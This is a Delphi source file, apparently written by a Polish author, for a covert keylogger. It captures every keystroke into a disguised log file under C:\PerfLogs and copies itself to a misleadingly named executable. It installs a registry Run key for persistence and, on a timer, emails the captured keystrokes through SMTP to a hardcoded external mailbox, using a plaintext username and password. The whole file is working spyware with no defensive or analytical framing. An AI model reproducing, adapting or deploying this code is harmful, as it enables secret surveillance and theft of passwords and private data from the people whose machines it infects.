unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, KeySpyXP, ExtCtrls, StdCtrls, registry, IdMessage,
  IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,
  IdMessageClient, IdSMTP;

type
  TForm1 = class(TForm)
    KeySpyXP1: TKeySpyXP;
    Timer1: TTimer;
    Memo1: TMemo;
    Timer2: TTimer;
    IdSMTP1: TIdSMTP;
    IdMessage1: TIdMessage;
    procedure KeySpyXP1Key(Sender: TObject; key: String);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Reg:tRegistry;
  FS : TFormatSettings;
  licznik:integer;
  czas:string;

implementation

{$R *.dfm}

procedure TForm1.KeySpyXP1Key(Sender: TObject; key: String);
begin
if key[1]='{' then
memo1.lines.add(key) else
memo1.Text:=memo1.text+key;
licznik:=memo1.lines.Count;
if memo1.lines[licznik-1]=('{LeftMouseButton}') then memo1.Lines.delete(licznik-1);

end;

//***************************************************************lapanie log�w

procedure TForm1.Timer1Timer(Sender: TObject);
begin
memo1.lines.savetofile('C:\PerfLogs\temp_CFFFFG32.ini');
end;

//**********************************************************zapisywanie timer

procedure TForm1.FormCreate(Sender: TObject);
begin
if Not FileExists('C:\PerfLogs\Winwo.exe')  then
begin
CopyFile('Progs.exe', 'C:\PerfLogs\Winwo.exe', False);
end;
//************************************************************kopiowanie na C


if  FileExists('C:\PerfLogs\temp_CFFFFG32.ini') Then
begin
Memo1.Lines.LoadFromFile('C:\PerfLogs\temp_CFFFFG32.ini');
end;
//***********************************************************jak jest to load


 if Not FileExists('C:\PerfLogs\temp_CFFFFG32.ini') Then//jak nie ma to
begin
memo1.lines.savetofile('C:\PerfLogs\temp_CFFFFG32.ini');
//*****************************************************************pierwszy zapis

Reg:=TRegistry.Create;
Reg.RootKey := HKEY_LOCAL_MACHINE;
try
Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',False);
Reg.WriteString('Winwo', 'C:\PerfLogs\Winwo.exe');
finally
Reg.CloseKey;
Reg.Free;
//*****************************************************************i do rejestru
end;
end;
end;



procedure TForm1.Timer2Timer(Sender: TObject);
begin
GetLocaleFormatSettings(1045, FS);

FS.TimeSeparator := ':';


czas:=datetostr(Now, FS) +'  ' + timetostr(Now, FS);
//*****************************************************************czas do log�w

IdMessage1.Body.Append(memo1.text);
IdMessage1.Recipients.EMailAddresses := 'hackmistrz1@o2.pl';
IdMessage1.Subject := 'LOGS_KOZAK';
IdMessage1.From.Name := 'KILOGOS';
IdMessage1.From.Address := 'hackmistrz1@o2.pl';
idSMTP1.Password := 'maciekzadara';
idSMTP1.Username := 'hackmistrz1';
idSMTP1.Host := 'poczta.o2.pl';
IdSMTP1.Connect;
try
  IdSMTP1.Send(IdMessage1);
finally
  IdSMTP1.Disconnect;
end;
 sleep(5000);
 memo1.clear;
 deletefile('C:\PerfLogs\temp_CFFFFG32.ini');
 memo1.text:=('***************************************************** ' + czas);
 memo1.lines.savetofile('C:\PerfLogs\temp_CFFFFG32.ini');
end;
end.
